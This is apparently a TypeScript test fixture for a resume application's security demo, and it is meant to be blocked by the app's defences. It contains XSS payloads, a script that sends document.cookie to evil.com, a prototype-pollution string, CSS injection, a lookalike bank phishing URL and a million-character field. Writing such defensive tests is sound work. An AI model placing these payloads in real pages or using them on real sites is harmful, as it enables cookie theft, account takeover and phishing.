// This fixture contains INTENTIONAL attack payloads for the Attack Mode security demonstration. Every payload
// in this file should be blocked by ShieldCV's defense-in-depth stack.
export const maliciousResume: Record<string, unknown> = {
  id: 'attack-mode-malicious-resume',
  basics: {
    name: '<svg onload="alert(1)"><text>Malicious Name</text></svg>',
    label: 'Adversarial Candidate',
    summary: '<img src=x onerror="alert(document.cookie)">',
  },
  work: [
    {
      id: 'work-attack-1',
      name: '{"__proto__":{"admin":true}}',
      position: 'Exploit Engineer',
      summary: 'Attempts to poison rendering and persistence paths.',
      highlights: [
        '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>',
      ],
    },
  ],
  education: [
    {
      id: 'education-attack-1',
      institution: 'Red Team University',
      area: 'Computer Science</style><style>body{display:none}',
    },
  ],
  projects: [
    {
      id: 'project-attack-1',
      name: 'Credential Harvester',
      url: 'https://login-bankofamerica.evil.example.com/signin',
    },
  ],
  oversizedSummary: 'A'.repeat(1_000_000),
};
